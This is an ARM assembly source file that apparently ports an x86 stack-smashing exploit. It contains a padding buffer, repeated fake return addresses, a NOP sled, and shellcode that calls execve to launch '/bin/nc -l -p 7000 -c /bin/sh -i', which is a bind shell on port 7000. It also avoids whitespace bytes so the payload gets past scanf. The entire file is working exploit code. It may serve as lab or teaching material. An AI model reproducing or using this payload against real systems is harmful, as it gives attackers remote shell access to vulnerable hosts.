
.text


	
	                // we must export the entry point to the ELF linker or
    .global _start      // loader. They conventionally recognize _start as their
                        // entry point. Use ld -e foo to override the default.

// Jump to actual code in .data section. Actual code shouold be there since it 
// should be allocated with the data that are modified (args). Data cannot be in
// .text (.text is not modifiable) hence code should be in .data

	_start:
	
	ldr r0, =start_nops
	b r0

.data
// representation of the stack
buffer:	.space		16, 'A'		// dummy, it represent the buffer to smash


//       set this from outside using --defsym sym=value option of gnu as
//	.set	fakerp, 0xbffff670   // this is ok for debian sarge, both short and long argv[0]


		
	// we do not know exactly where the %eip is saved 
	// then we put here more than one copy
	// this is a fortunate situtation since the buffer is located very near
	// to the return address, no local variable is affected and hence
	// function finishing is granted

	.long		fakerp
	.long		fakerp
	.long		fakerp
	.long		fakerp
	.long		fakerp
	.long		fakerp
	.long		fakerp
	.long		fakerp
	.long		fakerp
	.long		fakerp
	.long		fakerp

	
// the data of the payload
data_start:	
	.align		4
	.ascii		"arg>"		// 4 bytes keep allignement
	
p0:	.asciz		"/bin/nc"          // executable to launch with parameters...
p1:	.asciz		"-l"               // listen mode
p2:	.asciz          "-p"		   // port
p3:	.asciz          "7000"		   //   6000
p4:	.asciz          "-c"               // command to execute when connected:	
p5:	.ascii          "/bin/sh"	   //   a shell
p5b:	.asciz		"!-i"              //  "!" will be translated into a space


args:	//arguments array
pp0:	.long		0
pp1:	.long		0
pp2:	.long		0
pp3:	.long		0
pp4:	.long		0
pp5:	.long		0
pp6:	.long		0

	.ascii		"env>"
env:	.long		0                  // no envinoment 

	
	        

	.ascii		"nops_nops_nops_nops>"
	.align		4


// the code of the payload
	
start_nops:
//  .space		923, 0x90		// 0x90 is opcode of NOP
        .rept   128
        .long   0xe1a00000
        .endr

// execute the /bin/sh
	
	// get the address of the pop instruction
//	call self
self:
//	pop %ebp

  // adjust instruction with 0x20 (ldr r2, =env)
  ldr r7, =addrr2
  ldrh r1,[r7]
  add r1, r1, #512
  strh r1,[r7]

	//set up parameters
	//leal	(p0-self) (%ebp), %ebx	// first argument:  pathname executable
  ldr r0, =p0	// first argument:  pathname executable

	//leal	(args-self) (%ebp), %ecx		// second argument: pointer to array (zero terminated) of strings (zero terminated)
  ldr r1, =args	 // second argument: pointer to array (zero terminated) of strings (zero terminated)

	//leal	(p0-self)(%ebp), %eax
	mov r7, r0

	//movl	%eax, (pp0-self)(%ebp)
	ldr r0, =pp0
	str r7, [r0]

	//leal	(p1-self)(%ebp), %eax
	//movl	%eax, (pp1-self)(%ebp)
	ldr r7, =p1
	ldr r0, =pp1
	str r7, [r0]

	//leal	(p2-self)(%ebp), %eax
	//movl	%eax, (pp2-self)(%ebp)
	ldr r7, =p2
	ldr r0, =pp2
	str r7, [r0]

	//leal	(p3-self)(%ebp), %eax
	//movl	%eax, (pp3-self)(%ebp)
	ldr r7, =p3
	ldr r0, =pp3
	str r7, [r0]

	//leal	(p4-self)(%ebp), %eax
	//movl	%eax, (pp4-self)(%ebp)
	ldr r7, =p4
	ldr r0, =pp4
	str r7, [r0]

	//leal	(p5-self)(%ebp), %eax
	//movl	%eax, (pp5-self)(%ebp)
	ldr r7, =p5
	ldr r0, =pp5
	str r7, [r0]

	//p5b should be traslated into a space
	//decb	(p5b-self)(%ebp)     
	ldr r0, =p5b
	ldrb r7, [r0]
	sub r7, r7, #1
	strb r7, [r0]
		
  //leal	(env-self) (%ebp), %edx		// third argument: environment, pointer to array of strings
addrr2:
  ldr r0, =env	// third argument: environment, pointer to array of strings
  // ldr r2, =env

	//movl	$111,%eax
	//subl	$100,%eax
	
	mov r7, #111
	sub r7, r7, #100  // execve syscall #
						// system call number 11 (sys_execve)
						// this fancy way does not introduce white-space chars

  ldr r0, =p1	// first argument:  pathname executable
  sub r0, r0, #8

        #int     $0x80				// call kernel
  svc #0            // invoke syscall
	.ascii "<int"
	.ascii "\n"	//scanf now recognize the end of the field!
